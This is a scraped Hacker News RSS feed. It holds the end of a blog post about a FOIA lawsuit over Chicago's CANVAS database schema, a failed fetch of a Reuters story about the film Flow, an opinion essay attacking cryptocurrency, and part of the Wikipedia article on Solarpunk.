<p>An example of a system whose database schema information is released was the Chicago Budget System (CBS). A total of 110 tables are listed, with descriptions and a link to each table's columns. An interesting table worth investigation on its own is, <code>BOOK_ALDERMANIC_PAYRATE</code>, which is described as, "data used for creating pay schedule for aldermanic staff published in the Budget Book". Good to know!</p><p>

Metalicious received <a href="https://www.smartchicagocollaborative.org/city-of-chicago-launches-the-first-comprehensive-public-municipal-data-dictionary/">some attention</a> in civic data circles:</p>

<pre><code><em>Journalists and civic inquisitors can use it to determine what information is available when composing Freedom of Information Act requests. Based on my own experience, knowing what to even ask for has been a challenge. <strong>All that is over.</strong></em></code></pre>



<h2>All That Is Over: Its Inevitable Shutdown</h2>

<p>Within a few short years, the project ostensibly shut down and its front page was replaced with a message about being down for "temporary maintenance". That temporary maintenance has been ongoing for about nine years now. </p>

<center><p><img src="https://mchap.io/assets/data_dictionary_temporary_maintenance.png" alt="Down For Maintenance" title=""></p></center>


<p>Back in 2018, I asked the City's now-former Chief Data Officer Tom Schenk why it was shut down, and he explained:</p>

<p><code><pre><em>Metalicious was retired because of lack of resources to expand it (originally grant funded). It had some, but very, very small proportion of databases. There was security review of any published data and some information was withheld if we felt it could undermine the application security. By Info Sec policy, it is confidential information until a review deems it appropriate for public release--same as the open data workflow which mirrors the FOIA workflow.</em></pre></code></p><p>RIP.</p>

<p><a href="https://datadictionary.cityofchicago.org/"> Down For Maintenance </a>
|<a href="https://web.archive.org/web/20160211131329/http://datadictionary.cityofchicago.org:80/">Last-Known Running </a>
|<a href="https://github.com/Chicago/metalicious"> Metalicious GitHub </a></p>

<h2>Requesting Metalicious</h2>

<p>Okay, that's not surprising, but since the first goal here was to figure out whether column and table names are requestable, I <a href="https://web.archive.org/web/20190515215522/https://www.chicago.gov/city/en/depts/doit/provdrs/data_sciences.html">submitted my request for the MySQL dump of Metalicious</a>. As these things go, that request was also denied:</p>

<pre><code><em>Please be advised the Department of Innovation and Technology neither maintains nor possesses any records that are responsive to your FOIA request.</em></code></pre>

<p>So, I submitted another request and was sure to included a quote from a<a href="https://www.chicago.gov/city/en/depts/mayor/press_room/press_releases/2013/october_2013/mayor_rahm_emanuelandthedepartmentofinnovationandtechnologylaunc.html"> press release that was explicit about the Department's ownership of Metalicious.</a> 

</p><p>They eventually sent me a copy of a MySQL dump with about 150 databases' columns and table names, including their descriptions. Neat! Progress!</p>

<p>To me, this reasonably shows that the City <em>can</em> provide table names and column names of City databases under IL FOIA.</p>

<h2>The CANVAS Request and Trial</h2>

<p>This brings us back to the FOIA request for the CANVAS database schema, which was twice appealed and died at the Illinois Supreme Court.</p>

<p>The request included a SQL statement for the City to run in order to fulfil the request. I made some small mistakes that bit me later, which is ripe for another whole post. Essentially, the City denied the request by arguing that the release of this information would jeopardize the security of Chicago's systems:</p>

<pre><code><em>Your request seeks a copy of tables or columns within each table of CANVAS. The dissemination of these pieces of network information could jeopardize the security of the systems of the City of Chicago.  Please be advised that even if you were to narrow your request, certain records may be withheld from disclosure under the exemptions enumerated in the FOIA, including but not limited to the exemption set forthin 5 ILCS 140/7(1)(o).</em></code></pre>

<p>I disagree wholeheartedly and Thomas Ptacek goes into more detail in his <a href="https://sockpuppet.org/blog/2025/02/09/fixing-illinois-foia/">companion post.</a></p>


<p>Upon recieving this denial, I reached out to my attorneys at <a href="https://www.loevy.com/">Loevy &amp; Loevy</a> who agreed to sue.</p>


<h2>"Civic Hacker"</h2>

<p>Eventually there was a trial in January 2020. During the trial, the City's attorneys argued that my intent was nefarious:</p>

<pre><code><em>They are seeking the ability to have information that helps Mr. Chapman, civic hacker, go into the system and manipulate the data for whatever means he sees fit. That is not something that FOIA requires the City to do.</em></code></pre>

<p>I have no idea where they came up with the idea that I wanted to manipulate their data, especially considering that just four months earlier, I was asked to help the City with parking ticket reform. </p>

<p>While we were waiting for the trial date, Kate LeFurgy, Director of Comms for the Office of the Mayor, reached out to me and asked if I could help with some parking ticket analysis (for free). I agreed, and compiled a spreadsheet detailing how a large number of vehicles received a disproportionate number of tickets—groupings that highlight, for example, one vehicle which received at least three tickets per week for 41 continuous weeks.</p>

<pre><code><em>This is incredible. I can't thank you enough as to how helpful this was. I truly appreciate your time and talents on this work. It has been invaluable in shaping the reform measures we hope to put in place later this year.
-Kate LeFurgy | Fri, Aug 23, 2019</em></code></pre>

<p>Those good spirits did not last long, and LeFurgy did not respond to my emails asking for thoughts on the CANVAS litigation.</p>


<h2>Privacy When It's Convenient</h2>


<p>Chicago's expert witness, Bruce Coffing, said in court:</p>

<pre><code><em>In this particular case we are saying, I'm saying that from defending this, our constituents' information, their private information, one of the things that helps us defend that system is not making this [schema information] available.

It is not the only thing we do. We do many things. But I don't want to make it easier for the bad guys and bad gals out there to attack our system and let— put our constituents' private data at risk.</em></code></pre>

<p>This argument is striking to me, because the City has already shared so much private data through FOIA.</p>

<p>For instance, in 2018, when I requested parking ticket data from the Department of Finance, their FOIA officer told me that they could not include both license plates <em>and</em>the vehicles' registered address. To resolve this issue, they offered to remove license plate data and only provide addresses.</p>

<p>However, they had <em>already</em> given me the license plate data of millions of ticketed vehicles, in response to a different, earlier FOIA request. So, I received registered home addresses from one request, and license plates from another.</p>

<p>The responsive records from these two separate FOIA requests can easily be paired.</p>

<p>To demonstrate the extent of this problem, I <a href="https://observablehq.com/d/026992341cc47ff0">created this visualization</a> which shows the scale of private information disclosed by the Department of Finance: vehicle addresses from every U.S. state, including 11,057 unique addresses of Texas vehicles and 48,707 from Michigan.</p>

<center><img src="https://mchap.io/assets/tickets_address_observable.png" title=""></center>

<p>I've been told by a reliable source that the Department of Finance no longer sends license plates nor registered addresses in response to FOIA requests.</p>


<h2>Next Steps</h2>

<p>The whole point of this entire thing was to make it easier to request data through FOIA. Ultimately, the goal is to simply send a SQL statement to an agency for them to run, and avoid so much of the usual nonsense. Basically, an API.</p>

<p>Relatedly, these <a href="https://www.ilga.gov/legislation/BillStatus.asp?DocNum=2640&amp;GAID=17&amp;DocTypeID=SB&amp;LegID=150940&amp;SessionID=112&amp;SpecSess=&amp;Session=&amp;GA=103">two</a> <a href="https://www.ilga.gov/legislation/BillStatus.asp?DocNum=3076">bills</a> from last year were interesting, and sought to fix the IL Supreme Court's bad decision. But they didn't go anywhere during last year's session.</p>

<p>Fortunately this year, a <a href="https://www.ilga.gov/legislation/BillStatus.asp?DocNum=226&amp;GAID=18&amp;DocTypeID=SB&amp;LegId=157537&amp;SessionID=114&amp;GA=104">new bill</a> was filed with the addition of this language:</p>

<p><code><em><pre>[...] and shall include the identification and a plain-text description of each of the types or categories of information of each field of each database of the public body. [...] and shall provide a sufficient description of the structures of all databases under the control of the public body to allow a requester to request the public body to perform specific database queries.</pre></em></code>

That's pretty neat! I hope it passes.

</p><!-- text end -->

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Blender-made movie Flow takes Oscar (728 pts)]]></title>
            <link>https://www.reuters.com/lifestyle/flow-wins-best-animated-feature-film-oscar-2025-03-03/</link>
            <guid>43237273</guid>
            <pubDate>Mon, 03 Mar 2025 01:17:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/lifestyle/flow-wins-best-animated-feature-film-oscar-2025-03-03/">https://www.reuters.com/lifestyle/flow-wins-best-animated-feature-film-oscar-2025-03-03/</a>, See on <a href="https://news.ycombinator.com/item?id=43237273">Hacker News</a></p>
Couldn't get https://www.reuters.com/lifestyle/flow-wins-best-animated-feature-film-oscar-2025-03-03/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[The “strategic reserve” exposes crypto as the scam it always was (108 pts)]]></title>
            <link>https://alexkolchinski.com/2025/03/03/the-strategic-reserve-exposes-crypto-as-the-scam-it-always-was/</link>
            <guid>43236752</guid>
            <pubDate>Mon, 03 Mar 2025 00:08:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alexkolchinski.com/2025/03/03/the-strategic-reserve-exposes-crypto-as-the-scam-it-always-was/">https://alexkolchinski.com/2025/03/03/the-strategic-reserve-exposes-crypto-as-the-scam-it-always-was/</a>, See on <a href="https://news.ycombinator.com/item?id=43236752">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-477">

	

	
	<div>
		
<p>Today, President Trump announced that the US Government would begin using taxpayer dollars to systematically buy up a variety of cryptocurrencies. Crypto prices shot up on the news.</p>



<p>This is revealing, as crypto boosters have argued for years that cryptocurrency has legitimate economic value as a payment system outside of the government’s purview.</p>



<p>Instead, those same crypto boosters are now tapping the White House for money — in US Dollars, coming from US taxpayers.</p>



<p>Why?</p>



<p>Crypto has been one of the biggest speculative bubbles of all time, maybe the single biggest ever. Millions of retail investors have piled into crypto assets in the hope and expectation that prices will continue to go up. (Notice how much of the chatter around crypto is always around prices, as opposed to non-speculative uses.)</p>



<p>However, every bubble bursts once it runs out of gamblers to put new money in, and it may be that the crypto community believes that that time is near for crypto, as they are now turning to the biggest buyer in the world — the US Government — for help.</p>



<p>This shows that all the claims that crypto leaders have made for years about crypto’s value as a currency outside of government control have been self-serving lies all along: the people who have most prominently argued that position are now begging the White House to hand them USD for their crypto.</p>



<p>It also reveals how much crypto has turned into a cancer on our entire society.</p>



<p>In previous Ponzi schemes, the government has often stepped in to defuse bubbles and protect retail investors from being taken in by scammers.</p>



<p>But in this wave, not only has the government not stepped in to stop the scam, it has now been captured by people with a vested interest in keeping it going as long as possible.</p>



<p>Our president and a number of members of his inner circles hold large amounts of cryptocurrency and have a vested interested in seeing its value rise — Trump’s personal memecoin being a particularly notable example. And many other people in the corridors of power in Washington and Silicon Valley are in the same boat. “It is difficult to get a man to understand something, when his salary depends on his not understanding it”, and so some of the most prominent people in the country are now prepared to make any argument and implement any policy decision to boost the value of their crypto holdings.</p>



<p>How does this end?</p>



<p>Once the US taxpayer is tapped out, there’s not going to be any remaining larger pool of demand to keep crypto prices up, and in every previous speculative bubble, once confidence evaporates, prices will fall, probably precipitously. Unfortunately, as millions of people now have significant crypto holdings, and stablecoins have entangled crypto with fiat currency, the damage to the economy may be widespread. </p>



<p>The end of the crypto frenzy would, in the end, be a good thing. Cryptocurrency has a few legitimate uses, like helping citizens of repressive regimes avoid currency controls and reducing fees on remittances. But it has also enabled vast evil in the world. Diverting trillions of dollars away from productive investments into gambling is bad enough, but the untraceability of crypto has also enabled terrorist organizations, criminal networks, and rogue states like North Korea to fund themselves far more effectively than ever before. I’ve been hearing from my friends in the finance world that North Korea now generates a significant fraction, if not a majority, of its revenues by running crypto scams on Westerners, and that the scale of scams overall has grown by a factor of 10 since crypto became widely used (why do you think you’re getting so many calls and texts from scammers lately?)</p>



<p>I hope that the end of this frenzy of gambling and fraud comes soon. But in the meantime, let’s hope that not too much of our tax money goes to paying the scammers, and that when the collapse comes it doesn’t take down our entire economy with it.</p>







<p><em>Thanks to Alec Bell for helping edit this essay.</em></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Solarpunk (407 pts)]]></title>
            <link>https://en.wikipedia.org/wiki/Solarpunk</link>
            <guid>43236520</guid>
            <pubDate>Sun, 02 Mar 2025 23:39:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://en.wikipedia.org/wiki/Solarpunk">https://en.wikipedia.org/wiki/Solarpunk</a>, See on <a href="https://news.ycombinator.com/item?id=43236520">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
							

						<p>From Wikipedia, the free encyclopedia</p>
					</div><div lang="en" dir="ltr" id="mw-content-text">
<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Earthship_Community_home_2_-_panoramio.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Earthship_Community_home_2_-_panoramio.jpg/241px-Earthship_Community_home_2_-_panoramio.jpg" decoding="async" width="241" height="180" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Earthship_Community_home_2_-_panoramio.jpg/362px-Earthship_Community_home_2_-_panoramio.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Earthship_Community_home_2_-_panoramio.jpg/482px-Earthship_Community_home_2_-_panoramio.jpg 2x" data-file-width="2528" data-file-height="1888"></a><figcaption>Solarpunk may take practical inspiration from <a href="https://en.wikipedia.org/wiki/Earthship" title="Earthship">Earthships</a>, which are an example of <a href="https://en.wikipedia.org/wiki/Sustainable_architecture" title="Sustainable architecture">sustainable architecture</a>.<sup id="cite_ref-1"><a href="#cite_note-1"><span>[</span>1<span>]</span></a></sup><sup id="cite_ref-2"><a href="#cite_note-2"><span>[</span>2<span>]</span></a></sup></figcaption></figure>
<p><b>Solarpunk</b> is a <a href="https://en.wikipedia.org/wiki/Literary" title="Literary">literary</a> and <a href="https://en.wikipedia.org/wiki/Artistic" title="Artistic">artistic</a> movement, close to the <a href="https://en.wikipedia.org/wiki/Hopepunk" title="Hopepunk">hopepunk</a> movement,<sup id="cite_ref-3"><a href="#cite_note-3"><span>[</span>3<span>]</span></a></sup> that envisions and works toward actualizing a <a href="https://en.wikipedia.org/wiki/Sustainable_development" title="Sustainable development">sustainable future</a> interconnected with nature and community.<sup id="cite_ref-4"><a href="#cite_note-4"><span>[</span>4<span>]</span></a></sup><sup id="cite_ref-5"><a href="#cite_note-5"><span>[</span>5<span>]</span></a></sup><sup id="cite_ref-6"><a href="#cite_note-6"><span>[</span>6<span>]</span></a></sup> The "solar" represents <a href="https://en.wikipedia.org/wiki/Solar_energy" title="Solar energy">solar energy</a> as a <a href="https://en.wikipedia.org/wiki/Renewable_energy" title="Renewable energy">renewable energy</a> source and an <a href="https://en.wikipedia.org/wiki/Optimism" title="Optimism">optimistic</a> vision of the future that rejects <a href="https://en.wikipedia.org/wiki/Doomer" title="Doomer">climate doomerism</a>,<sup id="cite_ref-Johnson2_7-0"><a href="#cite_note-Johnson2-7"><span>[</span>7<span>]</span></a></sup> while the "punk" refers to <a href="https://en.wikipedia.org/wiki/Do_it_yourself" title="Do it yourself">do it yourself</a> and the <a href="https://en.wikipedia.org/wiki/Counterculture" title="Counterculture">countercultural</a>, <a href="https://en.wikipedia.org/wiki/Post-capitalism" title="Post-capitalism">post-capitalist</a>, and sometimes <a href="https://en.wikipedia.org/wiki/Decoloniality" title="Decoloniality">decolonial</a> aspects of creating such a future.<sup id="cite_ref-8"><a href="#cite_note-8"><span>[</span>8<span>]</span></a></sup>
</p><p>As a <a href="https://en.wikipedia.org/wiki/Science_fiction" title="Science fiction">science fiction</a> <a href="https://en.wikipedia.org/wiki/Literary_genre" title="Literary genre">literary subgenre</a> and <a href="https://en.wikipedia.org/wiki/Art_movement" title="Art movement">art movement</a>, solarpunk works to address how the future might look if humanity succeeded in solving major contemporary challenges with an emphasis on sustainability, <a href="https://en.wikipedia.org/wiki/Human_impact_on_the_environment" title="Human impact on the environment">human impact on the environment</a>, and addressing <a href="https://en.wikipedia.org/wiki/Climate_change" title="Climate change">climate change</a> and <a href="https://en.wikipedia.org/wiki/Pollution" title="Pollution">pollution</a>. Especially as a subgenre, it is aligned with <a href="https://en.wikipedia.org/wiki/Cyberpunk_derivatives" title="Cyberpunk derivatives">cyberpunk derivatives</a>, and may borrow elements from <a href="https://en.wikipedia.org/wiki/Utopian_and_dystopian_fiction" title="Utopian and dystopian fiction">utopian</a> and <a href="https://en.wikipedia.org/wiki/Fantasy" title="Fantasy">fantasy</a> genres.<sup id="cite_ref-Johnson2_7-1"><a href="#cite_note-Johnson2-7"><span>[</span>7<span>]</span></a></sup>
</p><p>Solarpunk serves as a foil to the cyberpunk genre, particularly within the fashion industry.<sup id="cite_ref-9"><a href="#cite_note-9"><span>[</span>9<span>]</span></a></sup> Both genres create and consolidate post-industrial countercultures; Solarpunk incites rebellion through its depiction of protoenvironmental socioecological relationships, whereas Cyberpunk advances the theme of rebellion through detached secondary environments, which often takes place in tangible dataspheres, virtual landscapes, and dystopian urban environments. Solarpunk draws inspiration from <a href="https://en.wikipedia.org/wiki/Bohemian_style" title="Bohemian style">Bohemian style</a>. The convergence of environmentalism and art serve as a framework for both subgenres. Solarpunk's interpretation of social collectivism strongly contrasts the individuality of Bohemian counterculture; Solarpunk recognizes individuality as an integral component of <a href="https://en.wikipedia.org/wiki/Progressivism" title="Progressivism">progressivism</a> and identifies sociocultural distinctions as an impetus for change, though solarpunk encompasses these elements within the greater socioecological scaffolding in a manner that contrasts the Bohemian assertion that individuality alone acts as the sole impetus for change.<sup id="cite_ref-10"><a href="#cite_note-10"><span>[</span>10<span>]</span></a></sup>
</p>
<meta property="mw:PageProp/toc">

<p>The term <i>solarpunk</i> was coined in 2008 in a blog post titled "From Steampunk to Solarpunk",<sup id="cite_ref-11"><a href="#cite_note-11"><span>[</span>11<span>]</span></a></sup> in which the anonymous author, taking the design of the <a href="https://en.wikipedia.org/wiki/MS_Beluga_Skysails" title="MS Beluga Skysails">MS <i>Beluga Skysails</i></a> (the world's first ship partially powered by a computer-controlled <a href="https://en.wikipedia.org/wiki/Kite_rig" title="Kite rig">kite rig</a>) as inspiration, conceptualizes a new speculative fiction subgenre with <a href="https://en.wikipedia.org/wiki/Steampunk" title="Steampunk">steampunk</a>'s focal point on specific technologies but guided by practicality and modern economics.<sup id="cite_ref-Williams_12-0"><a href="#cite_note-Williams-12"><span>[</span>12<span>]</span></a></sup> Along a similar vein, in 2009, literary publicist Matt Staggs posted a "GreenPunk Manifesto" on his blog describing his vision of a technophilic genre focused on knowable, <a href="https://en.wikipedia.org/wiki/Do_it_yourself" title="Do it yourself">do it yourself</a> technologies and with emphasis on positive ecological and social change.<sup id="cite_ref-13"><a href="#cite_note-13"><span>[</span>13<span>]</span></a></sup><sup id="cite_ref-14"><a href="#cite_note-14"><span>[</span>14<span>]</span></a></sup> After visual artist Olivia Louise posted concept art on <a href="https://en.wikipedia.org/wiki/Tumblr" title="Tumblr">Tumblr</a> of a solarpunk aesthetic in 2014,<sup id="cite_ref-15"><a href="#cite_note-15"><span>[</span>15<span>]</span></a></sup> researcher Adam Flynn contributed to the science fiction forum <a href="https://en.wikipedia.org/wiki/Project_Hieroglyph" title="Project Hieroglyph">Project Hieroglyph</a> with further definition of the emerging genre.<sup id="cite_ref-16"><a href="#cite_note-16"><span>[</span>16<span>]</span></a></sup><sup id="cite_ref-grist_17-0"><a href="#cite_note-grist-17"><span>[</span>17<span>]</span></a></sup> Based on Flynn's notes and contributions on the website solarpunks.net, <i>A Solarpunk Manifesto</i> was published in 2019. It describes solarpunk as "a movement in speculative fiction, art, fashion, and activism that seeks to answer and embody the questions 'what does a sustainable civilization look like, and how can we get there?<span>'</span>".<sup id="cite_ref-18"><a href="#cite_note-18"><span>[</span>18<span>]</span></a></sup> In 2024, <i>solarpunk</i> entered <a href="https://en.wikipedia.org/wiki/The_Encyclopedia_of_Science_Fiction" title="The Encyclopedia of Science Fiction">The Encyclopedia of Science Fiction</a>. Here, James Machell points to <a href="https://en.wikipedia.org/wiki/Songs_from_the_Stars" title="Songs from the Stars">Songs from the Stars</a> by <a href="https://en.wikipedia.org/wiki/Norman_Spinrad" title="Norman Spinrad">Norman Spinrad</a> as the subgenre's first text, and goes on to contrast solarpunk with <a href="https://en.wikipedia.org/wiki/Cyberpunk" title="Cyberpunk">cyberpunk</a>, stating, "It is a rebellion against a rebellion, born out of <a href="https://en.wikipedia.org/wiki/Dystopia" title="Dystopia">dystopia</a> fatigue."<sup id="cite_ref-sf-encyclopedia_19-0"><a href="#cite_note-sf-encyclopedia-19"><span>[</span>19<span>]</span></a></sup>
</p>
<div><h2 id="Themes_and_philosophy">Themes and philosophy</h2><p><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Solarpunk&amp;action=edit&amp;section=2" title="Edit section: Themes and philosophy"><span>edit</span></a><span>]</span></span></p></div>

<p>While solarpunk has no specific political ideation, it does by default embrace the need for a collective movement away from polluting forms of energy.<sup id="cite_ref-20"><a href="#cite_note-20"><span>[</span>20<span>]</span></a></sup> It practices <a href="https://en.wikipedia.org/wiki/Prefigurative_politics" title="Prefigurative politics">prefigurative politics</a>, creating spaces where the principles of a movement can be explored and demonstrated by enacting them in real life. Solarpunks practice the movement in various ways, including creating and living in communities (such as <a href="https://en.wikipedia.org/wiki/Ecovillages" title="Ecovillages">ecovillages</a>), growing their own food, and a DIY ethic of working with what is available, including the thoughtful application of technology.<sup id="cite_ref-rewire_21-0"><a href="#cite_note-rewire-21"><span>[</span>21<span>]</span></a></sup><sup id="cite_ref-22"><a href="#cite_note-22"><span>[</span>22<span>]</span></a></sup>
</p>

<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Solarpunk_community_center.png"><img alt="A Solarpunk illustration of a middle-aged woman in an orange jacket, holding a miner's helmet and a flyer. She's looking at a monument of a wind turbine engineer holding hand and helping a miner get out of a hole, a symbol of the respecialization of workers which took place in the community center below them. The building is clearly made of several different styles, a fancy solarpunk architecture covering two top floors above much simpler, glass two on the ground. The whole scene is bathed in warm light of dawn." src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Solarpunk_community_center.png/220px-Solarpunk_community_center.png" decoding="async" width="220" height="272" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Solarpunk_community_center.png/330px-Solarpunk_community_center.png 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Solarpunk_community_center.png/440px-Solarpunk_community_center.png 2x" data-file-width="2284" data-file-height="2823"></a><figcaption>Solarpunk works often include visions of positive social change, like the above illustration of a respecialization center for former miners who lost their profession as the world abandoned fossil fuels.<sup id="cite_ref-23"><a href="#cite_note-23"><span>[</span>23<span>]</span></a></sup></figcaption></figure>
<p>Stories set in the far future or in fantasy worlds often portray societal failures recognizable to contemporary audiences.<sup id="cite_ref-sciphijournal_24-0"><a href="#cite_note-sciphijournal-24"><span>[</span>24<span>]</span></a></sup> These failures may include oppressive imbalances of wealth or power, degradation of natural habitat or processes, and impacts of climate change. Evidence of injustices, like <a href="https://en.wikipedia.org/wiki/Social_exclusion" title="Social exclusion">social exclusion</a> and <a href="https://en.wikipedia.org/wiki/Environmental_racism" title="Environmental racism">environmental racism</a>, may be present. Disastrous consequences are not necessarily averted but solarpunk tends to present a counter-dystopian perspective. Their worlds are not necessarily utopian but rather solarpunk seeks to present an alternative to a pessimistic, consequential dystopian outcome.<sup id="cite_ref-Johnson_25-0"><a href="#cite_note-Johnson-25"><span>[</span>25<span>]</span></a></sup> To achieve this, themes of do it yourself ethics, convivial conservation, <a href="https://en.wikipedia.org/wiki/Self-sustainability" title="Self-sustainability">self-sustainability</a>, social inclusiveness and <a href="https://en.wikipedia.org/wiki/Positive_psychology" title="Positive psychology">positive psychology</a> are often present. This perspective also more closely embeds the ideals of <a href="https://en.wikipedia.org/wiki/Punk_ideologies" title="Punk ideologies">punk ideologies</a>, such as <a href="https://en.wikipedia.org/wiki/Anti-consumerism" title="Anti-consumerism">anti-consumerism</a>, <a href="https://en.wikipedia.org/wiki/Egalitarianism" title="Egalitarianism">egalitarianism</a> and <a href="https://en.wikipedia.org/wiki/Decentralization" title="Decentralization">decentralization</a>, than cyberpunk which typically includes protagonists with punk beliefs but in settings that are used more as a warning of a potential future.<sup id="cite_ref-Johnson_25-1"><a href="#cite_note-Johnson-25"><span>[</span>25<span>]</span></a></sup><sup id="cite_ref-singularity_26-0"><a href="#cite_note-singularity-26"><span>[</span>26<span>]</span></a></sup>
</p>
<div><h3 id="Sustainable_technology">Sustainable technology</h3><p><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Solarpunk&amp;action=edit&amp;section=5" title="Edit section: Sustainable technology"><span>edit</span></a><span>]</span></span></p></div>
<p>The integration of technologies into society in a manner that improves <a href="https://en.wikipedia.org/wiki/Social_sustainability" title="Social sustainability">social</a>, economic and environmental <a href="https://en.wikipedia.org/wiki/Sustainability" title="Sustainability">sustainability</a> is central to solarpunk.<sup id="cite_ref-Johnson_25-2"><a href="#cite_note-Johnson-25"><span>[</span>25<span>]</span></a></sup> It is starkly contrasted to cyberpunk which portrays highly advanced technologies that have little influence on, or otherwise exacerbate social, economic, and environmental problems. Whereas cyberpunk envisions humanity becoming more alienated from its natural environment and subsumed by technology, solarpunk envisions settings where technology enables humanity to better co-exist with itself and its environment.<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources. (August 2022)">citation needed</span></a></i>]</sup>
</p><p>Solarpunk is more similar to steampunk than cyberpunk. Both steampunk and solarpunk imagine new worlds but with different primary sources of energy; respectively, the <a href="https://en.wikipedia.org/wiki/Steam_engine" title="Steam engine">steam engines</a>, and <a href="https://en.wikipedia.org/wiki/Renewable_energy" title="Renewable energy">renewable energy</a>.<sup id="cite_ref-longreads_27-0"><a href="#cite_note-longreads-27"><span>[</span>27<span>]</span></a></sup> Though, whereas steampunk focuses more on history and uses <a href="https://en.wikipedia.org/wiki/Victorian_era" title="Victorian era">Victorian era</a> aesthetics, solarpunk uses more Art Nouveau style and looks to the future. Solarpunk also shares some elements with <a href="https://en.wikipedia.org/wiki/Retrofuturism" title="Retrofuturism">retrofuturism</a>, <a href="https://en.wikipedia.org/wiki/Afrofuturism" title="Afrofuturism">Afrofuturism</a>, <a href="https://en.wikipedia.org/wiki/Bionics" title="Bionics">Bionics</a> and <a href="https://en.wikipedia.org/wiki/Arts_and_Crafts" title="Arts and Crafts">Arts and Crafts</a>. The retrofuturist reevaluation of technology, its desire for understandable mechanics, and rejection of mysterious <a href="https://en.wikipedia.org/wiki/Black_box" title="Black box">black box</a> technology, and in favor of <a href="https://en.wikipedia.org/wiki/Appropriate_technology" title="Appropriate technology">appropriate technology</a>,<sup id="cite_ref-28"><a href="#cite_note-28"><span>[</span>28<span>]</span></a></sup> are found in solarpunk works. As is the Afrofuturist's counter to mass-cultural homogeneity, the reckoning of injustices, and use of architecture and technology to correct power imbalances and problems in accessibility.<sup id="cite_ref-Johnson_25-3"><a href="#cite_note-Johnson-25"><span>[</span>25<span>]</span></a></sup>
</p>
<div><h3 id="Do-it-yourself_ethos">Do-it-yourself ethos</h3><p><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Solarpunk&amp;action=edit&amp;section=6" title="Edit section: Do-it-yourself ethos"><span>edit</span></a><span>]</span></span></p></div>
<p>Although solarpunk is concerned with technology, it also embraces low-tech ways of living sustainably such as <a href="https://en.wikipedia.org/wiki/Gardening" title="Gardening">gardening</a>, <a href="https://en.wikipedia.org/wiki/Permaculture" title="Permaculture">permaculture</a>, <a href="https://en.wikipedia.org/wiki/Regenerative_design" title="Regenerative design">regenerative design</a>, <a href="https://en.wikipedia.org/wiki/Tool_library" title="Tool library">tool libraries</a>, <a href="https://en.wikipedia.org/wiki/Hackerspace" title="Hackerspace">maker spaces</a>, <a href="https://en.wikipedia.org/wiki/Open_source" title="Open source">open-source</a>, <a href="https://en.wikipedia.org/wiki/Positive_psychology" title="Positive psychology">positive psychology</a>, <a href="https://en.wikipedia.org/wiki/Metacognition" title="Metacognition">metacognition</a>, and <a href="https://en.wikipedia.org/wiki/Do-it-yourself" title="Do-it-yourself">do-it-yourself</a> ethics. Its themes may reflect on <a href="https://en.wikipedia.org/wiki/Environmental_philosophy" title="Environmental philosophy">environmental philosophy</a> such as <a href="https://en.wikipedia.org/wiki/Bright_green_environmentalism" title="Bright green environmentalism">bright green environmentalism</a> and <a href="https://en.wikipedia.org/wiki/Social_ecology_(Bookchin)" title="Social ecology (Bookchin)">social ecology</a>, as well as <a href="https://en.wikipedia.org/wiki/Punk_ideologies" title="Punk ideologies">punk ideologies</a> such as <a href="https://en.wikipedia.org/wiki/Anarchism" title="Anarchism">anarchism</a>, <a href="https://en.wikipedia.org/wiki/Socialism" title="Socialism">socialism</a>, <a href="https://en.wikipedia.org/wiki/Anti-consumerism" title="Anti-consumerism">anti-consumerism</a>, <a href="https://en.wikipedia.org/wiki/Anti-authoritarianism" title="Anti-authoritarianism">anti-authoritarianism</a>, <a href="https://en.wikipedia.org/wiki/Anti-capitalism" title="Anti-capitalism">anti-capitalism</a>, <a href="https://en.wikipedia.org/wiki/Civil_and_political_rights" title="Civil and political rights">civil rights</a>, <a href="https://en.wikipedia.org/wiki/Commoning" title="Commoning">commoning</a>, and <a href="https://en.wikipedia.org/wiki/Decentralization" title="Decentralization">decentralization</a>.<sup id="cite_ref-29"><a href="#cite_note-29"><span>[</span>29<span>]</span></a></sup><sup id="cite_ref-30"><a href="#cite_note-30"><span>[</span>30<span>]</span></a></sup>
</p>
<div><h3 id="Racial_and_gender_equality">Racial and gender equality</h3><p><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Solarpunk&amp;action=edit&amp;section=7" title="Edit section: Racial and gender equality"><span>edit</span></a><span>]</span></span></p></div>
